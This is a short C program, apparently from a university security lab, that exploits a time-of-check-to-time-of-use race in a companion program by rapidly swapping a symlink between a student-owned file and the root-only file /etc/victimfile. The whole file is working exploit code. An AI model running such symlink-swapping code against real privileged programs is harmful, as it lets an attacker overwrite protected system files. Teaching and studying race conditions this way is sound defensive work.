/* 3000fast-swap.c
   
   Quickly swap files that are being used by 3000run-write.c.
   This is part of how to exploit TOCTTOU (race condition) 
   vulnerability in 3000run-write.c

   Note it assumes that:
     /etc/victimfile is a file that is only writable by root
     /home/student/tmp exists (and is owned by student)
     /home/student/tmp/safefile exists (and is owned by student)

   Change hard coded files and sleep times to change conditions of
   the swapping.
*/

#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char *argv[])
{
        printf("Swapping between safefile and victimfile...\n");

        while(1) {
                unlink("/home/student/tmp/targetfile");
                symlink("/etc/victimfile",
                     "/home/student/tmp/targetfile");
                usleep(200);
                unlink("/home/student/tmp/targetfile");
                symlink("/home/student/tmp/safefile",
                     "/home/student/tmp/targetfile");
                usleep(200);
        }
        return 0;
}
